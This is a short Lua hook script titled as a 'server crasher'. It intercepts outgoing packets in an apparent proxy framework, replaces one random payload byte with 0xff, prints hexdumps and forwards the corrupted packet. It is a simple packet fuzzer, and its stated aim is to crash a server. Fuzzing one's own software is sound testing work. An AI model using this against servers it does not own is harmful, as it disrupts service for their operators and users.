-- Schrödinger's Server Crasher

ioannes.onSend = function(rawPkt)
    local pkt = ioannes.decode(rawPkt.data)
    local payload = pkt.payload
    local len = #payload

    local toChange = math.random(5, len - 1)
    local evil = payload:sub(1, toChange - 1) .. string.char(0xff) .. payload:sub(toChange + 1)

    print("orig:\n" .. hexdump(payload) .. "changed: " .. tostring(toChange) .. "\nevil:\n" .. hexdump(evil))

    pkt.payload = evil
    return ioannes.encode(pkt)
end
